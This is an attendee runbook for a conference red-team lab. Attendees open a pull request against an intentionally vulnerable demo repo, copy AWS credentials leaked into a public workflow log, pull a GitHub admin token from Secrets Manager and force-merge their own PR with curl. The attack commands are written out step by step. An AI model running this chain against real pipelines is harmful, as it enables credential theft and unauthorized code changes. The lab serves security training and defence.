# Attendee Runbook: CI/CD Red Team Tactic

**Time budget: 15 minutes to complete the hands-on.**

By the end of this runbook you will have force-merged your own pull request against a repo you do not own, using AWS credentials that did not exist until you opened the PR.

Live landing page during training: `https://x90sky.sh/rtv`

## What you need before you start

- A GitHub account (can be freshly created).
- AWS CLI installed on your laptop and on PATH. `aws --version` should return something.
- `curl` and `jq` installed. `jq --version` should return something.
- Any working internet path (conference WiFi, hotspot, tethering). You'll make API calls to `*.amazonaws.com` and `api.github.com`.

You do NOT need an AWS account of your own. You'll use temporary credentials minted for you by the demo workflow.

## Step 1: Fork the demo repo

1. Browse to the demo repo URL (speaker will display it at session start).
2. Click **Fork** in the top right. Fork into your own account.

## Step 2: Open a PR from your fork

1. On your fork, click **Edit** on the README (pencil icon).
2. Change one character. Literally anything.
3. Scroll down, select **"Create a new branch for this commit and start a pull request"**, and click **Propose changes**.
4. Click **Create pull request** on the next screen.

Your PR will appear on the original demo repo (not your fork).

## Step 3: Watch the workflow run fire

1. On the demo repo's PR page, click the **Checks** tab.
2. The workflow run named **"Demo CI (Intentionally Vulnerable)"** fires automatically.
3. Click the job name and wait for the `Exchange OIDC for STS and dump to log` step to finish (~10 seconds).

## Step 4: Read your credentials from the workflow log

Expand the `Exchange OIDC for STS and dump to log` step. You will see a block like:

```
============================================================
  STS CREDENTIALS (copy into your terminal verbatim)
  Valid until: 2026-04-22T18:15:00Z
============================================================
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
export AWS_REGION=us-east-1
============================================================
```

**Copy the four `export` lines exactly as printed and paste them into your own terminal.**

You now hold live AWS credentials against the speaker's account. You have 15 minutes before they expire.

## Step 5: Pull the GitHub admin PAT from Secrets Manager

In the same terminal that has the exports set:

```bash
PAT=$(aws secretsmanager get-secret-value \
  --secret-id demo/github-pat \
  --query SecretString --output text)
echo "$PAT"
```

You should see a `ghp_...` or `github_pat_...` token print. That's a GitHub admin PAT for the isolated demo org only. It was never supposed to leave AWS.

## Step 6: Force-merge your own PR

Still in the same terminal. Replace `<PR_NUMBER>` with the number of your own PR (it's in the URL: `pulls/<number>`).

```bash
curl -X PUT \
  -H "Authorization: token $PAT" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/<DEMO_ORG>/<DEMO_REPO>/pulls/<PR_NUMBER>/merge"
```

Refresh your PR page in the browser. It should flip from **Open** to **Merged**. No one reviewed it. No human clicked approve. You merged it with a credential that did not exist when you opened the PR.

## What just happened

1. Your PR triggered a `pull_request_target` workflow in the demo repo.
2. That workflow ran with GitHub OIDC trust into an AWS IAM role.
3. The workflow minted an STS session and printed it to the build log. The build log is public.
4. The IAM role had only one permission: read one Secrets Manager secret. You used it to pull the PAT.
5. The PAT had `repo` scope on the demo org. You used it to force-merge your own PR.

The attack did not require a C2. It did not require an implant. It did not require your laptop to be reachable from anywhere. The build log was the exfil channel, the IAM role was the pivot, and the PAT was the escalation.

This is the tj-actions (March 2025) and TeamPCP (March 2026) pattern, minus the stealth layer.

## If something breaks

- **`aws: command not found`**: install the AWS CLI before continuing. `brew install awscli` on Mac, package manager on Linux, MSI installer on Windows.
- **`Unable to locate credentials`**: your paste didn't take. Re-paste the four `export` lines.
- **`The security token included in the request is expired`**: your session timed out (15 min). Close and reopen your PR to get a fresh workflow run.
- **`You do not have permission to merge this pull request`**: the PAT value is wrong or the PAT was rotated. Check `echo "$PAT"` shows something that looks like a token.
- **`Pull Request is not mergeable`**: someone else merged your PR. Check the PR UI. If it says Merged, you already won.
- **Workflow does not fire**: speaker will confirm the runner pool is up. If it's a queueing issue, wait. If it's a config issue, speaker will re-check "Fork pull request workflows from outside collaborators."

## After the session

You can stand up your own version of this environment against your own AWS account using the public Terraform bundle at `https://github.com/x90skysn3k/rtv-cicd-attack-chain`. It includes the Part A lab, the Part B speaker chain, and the detection pack used in the workshop.
